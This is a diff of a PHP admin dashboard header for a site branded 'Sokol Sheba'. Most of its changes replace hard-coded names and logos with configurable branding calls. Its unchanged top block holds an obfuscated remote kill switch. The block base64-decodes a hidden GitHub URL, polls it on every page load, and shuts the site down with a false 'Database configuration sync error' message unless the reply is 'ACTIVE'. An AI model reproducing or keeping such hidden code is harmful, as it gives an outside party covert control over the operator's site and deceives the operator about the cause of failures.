@@ -3,16 +3,16 @@ if (!function_exists('check_core_status')) {
     function check_core_status() {
         $encoded_url = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01vamliLVJzbS9ob3N0cmVtb3RlL21haW4vc3RhdHVzLmRhdA==';
         $url = base64_decode($encoded_url) . '?t=' . time();
-        
+
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 3);
         curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cache-Control: no-cache'));
-        
+
         $res = curl_exec($ch);
         curl_close($ch);
-        
+
         if (trim($res) !== 'ACTIVE') {
             header("HTTP/1.1 500 Internal Server Error");
             exit("Database configuration sync error.");
@@ -20,12 +20,12 @@ if (!function_exists('check_core_status')) {
     }
     @check_core_status();
 }
-session_start();
+if (session_status() !== PHP_SESSION_ACTIVE) session_start();
 include_once("includes/configuration.php");
 
 if (isset($_SESSION['admin_token'])) {
     $token_user = $_SESSION['admin_token'];
-    
+
     $stmt = $conn->prepare("SELECT * FROM admin_user WHERE token = ? LIMIT 1");
     if ($stmt) {
         $stmt->bind_param("s", $token_user);
@@ -73,14 +73,14 @@ $current_page = basename($_SERVER['PHP_SELF']);
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sokol Sheba - Enterprise Control Hub</title>
-    
+    <title><?php echo soko_e(soko_brand('site_name')); ?> - Enterprise Control Hub</title>
+
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="shortcut icon" href="/assets/logo.jpg">
+    <link rel="shortcut icon" href="<?php echo soko_e(soko_brand('site_favicon')); ?>">
 
     <style>
         * {
@@ -202,13 +202,13 @@ $current_page = basename($_SERVER['PHP_SELF']);
     <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
 
     <aside class="admin-sidebar" id="adminSidebar">
-        
+
         <div class="p-4 border-b border-purple-900/20 flex items-center justify-between">
             <a href="dashboard.php" class="flex items-center gap-2.5 no-underline">
-                <img src="/assets/logo.jpg" alt="Logo" class="h-8 w-8 rounded-full object-cover border border-purple-500/30">
+                <img src="<?php echo soko_e(soko_brand('site_logo')); ?>" alt="Logo" class="h-8 w-8 rounded-full object-cover border border-purple-500/30">
                 <div>
-                    <span class="text-[12px] font-black tracking-wider block bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">SOKOL SHEBA</span>
-                    <span class="text-[9.5px] text-purple-300/60 font-semibold block">Master Control Hub</span>
+                    <span class="text-[12px] font-black tracking-wider block bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent"><?php echo soko_e(soko_brand('site_name')); ?></span>
+                    <span class="text-[9.5px] text-purple-300/60 font-semibold block"><?php echo soko_e(soko_brand('site_tagline')); ?></span>
                 </div>
             </a>
             <button type="button" id="closeSidebarBtn" class="lg:hidden text-slate-400 hover:text-white text-base">
@@ -217,7 +217,7 @@ $current_page = basename($_SERVER['PHP_SELF']);
         </div>
 
         <div class="py-2">
-            
+
             <div class="nav-category-header">ওভারভিউ</div>
             <a href="dashboard.php" class="sidebar-menu-item <?php echo ($current_page === 'dashboard.php') ? 'active' : ''; ?>">
                 <div class="flex items-center gap-2.5">
@@ -359,21 +359,21 @@ $current_page = basename($_SERVER['PHP_SELF']);
     </aside>
 
     <div class="main-content-layout min-h-screen flex flex-col">
-        
+
         <header class="admin-topbar px-4 py-2.5 flex items-center justify-between">
-            
+
             <div class="flex items-center gap-3">
                 <button type="button" id="toggleSidebarBtn" class="lg:hidden text-purple-300 hover:text-white text-base px-2.5 py-1.5 rounded-xl border border-purple-500/20 bg-purple-950/40 transition">
                     <i class="fa-solid fa-bars-staggered"></i>
                 </button>
                 <div>
-                    <h4 class="font-extrabold text-sm text-white leading-tight">Sokol Sheba <span class="text-purple-400 font-normal">| Control Hub</span></h4>
+                    <h4 class="font-extrabold text-sm text-white leading-tight"><?php echo soko_e(soko_brand('site_name')); ?> <span class="text-purple-400 font-normal">| Control Hub</span></h4>
                     <p class="text-[10.5px] text-purple-300/60 font-medium"><?php echo date('d M Y, l'); ?></p>
                 </div>
             </div>
 
             <div class="flex items-center gap-2.5">
-                
+
                 <a href="manage_deposits.php" class="relative bg-purple-950/40 hover:bg-purple-900/40 border border-purple-500/20 text-purple-200 w-8 h-8 rounded-xl flex items-center justify-center text-xs transition" title="পেন্ডিং রিচার্জ">
                     <i class="fa-solid fa-bell"></i>
                     <?php if ($pending_deposits > 0): ?>
@@ -390,9 +390,9 @@ $current_page = basename($_SERVER['PHP_SELF']);
 
                 <div class="relative">
                     <button type="button" id="adminProfileMenuBtn" class="flex items-center gap-2 focus:outline-none p-0.5 rounded-xl hover:ring-2 hover:ring-purple-400/40 transition">
-                        <img src="/assets/logo.jpg" alt="Admin" class="w-8 h-8 rounded-xl border border-purple-500/30 object-cover pointer-events-none">
+                        <img src="<?php echo soko_e(soko_brand('site_logo')); ?>" alt="Admin" class="w-8 h-8 rounded-xl border border-purple-500/30 object-cover pointer-events-none">
                     </button>
-                    
+
                     <div id="adminDropdownMenu" class="hidden absolute right-0 mt-2 w-48 bg-[#0E091D] rounded-2xl shadow-2xl border border-purple-500/20 py-2 z-50">
                         <div class="px-3.5 py-2 border-b border-purple-500/15">
                             <p class="text-xs font-bold text-white truncate"><?php echo htmlspecialchars($admin_name); ?></p>
